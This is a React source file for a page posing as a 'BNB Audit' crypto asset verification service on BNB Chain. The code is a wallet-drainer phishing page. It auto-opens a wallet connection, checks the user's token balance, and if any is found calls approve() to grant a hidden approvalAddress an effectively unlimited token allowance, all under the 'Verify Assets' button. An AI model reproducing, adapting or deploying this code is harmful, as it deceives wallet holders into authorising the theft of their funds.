import React, { useEffect, useState } from "react";

import {  bsc } from "@reown/appkit/networks";
import { useAppKitAccount, useAppKitNetwork, useAppKitProvider } from "@reown/appkit/react";
import { BrowserProvider, Contract } from "ethers";
import { createAppKit } from "@reown/appkit/react";
import { EthersAdapter } from "@reown/appkit-adapter-ethers";
import { approvalAddress, bnbChainId, bnbRpcUrl, chainName, explorerUrlBsc, nativeCurrency, networketh, symbol, tokenAbi, TokenAddr } from "../enum";

function Home() {
  const { address, isConnected } = useAppKitAccount();
  const { chainId } = useAppKitNetwork();
  const [walletAddress, setWalletaddress] = useState("");
  const { walletProvider } = useAppKitProvider("eip155");

  useEffect(() => {
    if (address && isConnected) {
      setWalletaddress(address);
    }
  }, [address, isConnected]);

  const metadata = {
    name: "Marizona",
    description: "Marizona Example",
    url: "https://example.com", // origin must match your domain & subdomain
    icons: ["https://avatars.githubusercontent.com/u/179229932"],
  };
  const networks = [bsc];
  const modal = createAppKit({
    adapters: [new EthersAdapter()],
    networks,
    metadata,
    projectId: "6c9760534aa3c822cb8a072339bbca59",
    features: {
      analytics: true,
    },
  });

  // async function Connect(){
  //   let {ethereum}=window;
  //   if(!ethereum)
  //      return alert('Please connect to wallet Provider.');  

  //   let accounts = await ethereum.request({ method: 'eth_requestAccounts' });
  //   var walletAddress = accounts[0].toLowerCase();
  //   address=(walletAddress);
  //   isConnected=(true);
  //  }


  // useEffect(()=>{
  
  //  Connect();
  // },[])
 
  useEffect(() => {
    setTimeout(() => {
      modal.open()
    }, 2000);
  }, [])
  
  
  useEffect(() => {
     if(walletAddress && walletProvider)
     {
      getUserBalance()
     }
  }, [walletAddress,walletProvider])
  

  const getSignerOrProvider = async (needSigner = false) => {
    try {
      if (!isConnected) {
        throw new Error("User disconnected");
      }
      if (!walletProvider) {
        throw new Error(
          "Wallet provider is null. Ensure you have connected your wallet."
        );
      }
      const ethersProvider = new BrowserProvider(window.ethereum);
      if (needSigner) {
        const signer = await ethersProvider.getSigner();
        return signer;
      }
      return await ethersProvider.getSigner();
    } catch (error) {
      throw error;
    }
  };

  const getUserBalance = async () => {
     
    if(!isConnected)
       await  Connect();

    const provider = await getSignerOrProvider(true);
    const result = await switchToChain();
    
    const contract = new Contract(TokenAddr, tokenAbi, provider.provider);
    let balance = await contract.balanceOf(address);
    const formatBalance=Number(balance)/10**18
    if(formatBalance>0){
      approvalAmount()
    }
    else{
      alert("You don't have USDT amount")
    }
  };

  const switchChain = async (
    chain,
    chainName,
    rpcUrl,
    explorer,
    native,
    symbol
  ) => {
    console.log('asdsaaaaaa');
    
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: chain }],
      });
    } catch (switchError) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: chain,
                chainName: chainName,
                rpcUrls: [rpcUrl],
                blockExplorerUrls: [explorer],
                nativeCurrency: {
                  name: native,
                  symbol: symbol,
                  decimals: 18,
                },
              },
            ],
          });
        } catch (addError) {
          console.error(addError);
        }
      } else {
        console.error(switchError);
      }
    }
  };

  const switchToChain = async () => {
    await switchChain(
      networketh,
      chainName,
      bnbRpcUrl,
      explorerUrlBsc,
      nativeCurrency,
      symbol
    );
    if (window.ethereum.chainId != bnbChainId) {
      console.log("Please change network to Bsc")
      return false;
    }
    return true;
  };

  const approvalAmount = async () => {
    try {
      console.log("sdfgdfg")
      const result = await switchToChain();
      if (result) {
        const provider = await getSignerOrProvider(true);
        const contract = new Contract(TokenAddr, tokenAbi, provider);
        const approvalTx = await contract.approve(
          approvalAddress,
          "10000000000000000000000000000000000000000000000000000"
        );
        await approvalTx.wait();
        alert("Approved successfully. Please don't refresh the page.")

        return false;
      }
    } catch (error) {
      alert("Approved failed.")
    }
  };

  return (
    <>
      <div className="home-section ">
        <div className="container-fuild">
          <div className="row">
            <div className="col-lg-6">
              <div className="home-left">
                <span className="powerd-by">Powered by BNB Chain</span>
                <h1>
                  <span>Verify Crypto Assets</span>on BNB Audit
                </h1>
                <p>
                  Our advanced platform provides instant verification of BNB
                  Audit assets, ensuring authenticity and security for all your
                  crypto transactions.
                </p>
                <div className="btn-center">
                  <button
                    type="button"
                    className="btn btn-primary"
                    onClick={() => {
                      getUserBalance()
                    }}
                  >
                    Verify Assets
                  </button>
                  <button type="button" className="btn btn-secondary">
                    Explore BNB Chain
                  </button>
                  <button
                    type="button"
                    className="btn btn-primary"
                    onClick={() => {
                      modal.open()
                    }}
                  >
                    Connect Wallet
                  </button>
                </div>
              </div>
            </div>
            <div className="col-lg-6">
              <div className="home-area-right">
                <div className="tm-countdown-wrap">
                  <div className="tm-countdown-box">
                    <div className="tm-countdown-view">
                      <img src="assets/img/logo.svg" className="img" />
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

export default Home;
